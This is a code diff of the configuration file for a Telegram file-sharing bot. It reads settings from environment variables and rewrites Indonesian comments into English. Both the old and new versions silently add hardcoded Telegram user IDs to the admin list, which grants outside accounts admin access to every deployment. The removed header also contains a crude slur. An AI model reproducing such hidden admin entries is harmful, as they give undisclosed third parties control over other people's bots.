@@ -1,89 +1,99 @@
-# (©)Codexbotz
-# Recife By Zaen @Mafia_Tobatz
-# Kalo clone Gak usah hapus 
-# gue tandain akun tele nya ngentod
+#(©)CodeXBotz
 
 
-import logging
+
+
+
 import os
+import logging
 from logging.handlers import RotatingFileHandler
 
-# Bot token dari @Botfather
+
+
+#Bot token @Botfather
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
 
-# API ID Anda dari my.telegram.org
+#Your API ID from my.telegram.org
 APP_ID = int(os.environ.get("APP_ID", ""))
 
-# API Hash Anda dari my.telegram.org
+#Your API Hash from my.telegram.org
 API_HASH = os.environ.get("API_HASH", "")
 
-# ID Channel Database
+#Your db channel Id
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 
-# OWNER ID
+#OWNER ID
 OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 
-# NAMA OWNER
-OWNER = os.environ.get("OWNER", "@Mafia_Tobatz")
+#Port
+PORT = os.environ.get("PORT", "8080")
 
-# Database
+#Database 
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
+DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")
 
-# ID dari Channel Atau Group Untuk Wajib Subscribenya
+#force sub channel id, if you want enable force sub
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
+
+#force sub group id, if you want enable force sub
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
 
-# ID dari Channel Atau Group Untuk Wajib Subscribenya
+#force sub channel1 id, if you want enable force sub
 FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "0"))
+
+#force sub group1 id, if you want enable force sub
 FORCE_SUB_GROUP1 = int(os.environ.get("FORCE_SUB_GROUP1", "0"))
 
-# ID dari Channel Atau Group Untuk Wajib Subscribenya
+#force sub channel2 id, if you want enable force sub
 FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))
-
-
+  
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
-# Pesan Awalan /start
-START_MSG = os.environ.get(
-    "START_MESSAGE",
-    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
-)
+#start message
+START_MSG = os.environ.get("START_MESSAGE", "Hello {first}\n\nI can store private files in Specified Channel and other users can access it from special link.")
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
+    ADMINS=[]
+    for x in (os.environ.get("ADMINS", "").split()):
+        ADMINS.append(int(x))
 except ValueError:
-    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
+        raise Exception("Your Admins list does not contain valid integers.")
 
-# Pesan Saat Memaksa Subscribe
-FORCE_MSG = os.environ.get(
-    "FORCE_SUB_MESSAGE",
-    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
-)
+#Force sub message 
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")
 
-# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
+#set your Custom Caption here, Keep None for Disable Custom Caption
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
-# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
-DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
+#set True if you want to prevent users from forwarding files from bot
+PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False
+
+#Set true if you want Disable your Channel Posts Share button
+if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True':
+    DISABLE_CHANNEL_BUTTON = True
+else:
+    DISABLE_CHANNEL_BUTTON = False
+
+BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
+USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(1250450587)
-ADMINS.append(844432220)
-ADMINS.append(1750080384)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
 logging.basicConfig(
     level=logging.INFO,
-    format="[%(levelname)s] - %(name)s - %(message)s",
-    datefmt="%d-%b-%y %H:%M:%S",
+    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
+    datefmt='%d-%b-%y %H:%M:%S',
     handlers=[
-        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
-        logging.StreamHandler(),
-    ],
+        RotatingFileHandler(
+            LOG_FILE_NAME,
+            maxBytes=50000000,
+            backupCount=10
+        ),
+        logging.StreamHandler()
+    ]
 )
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
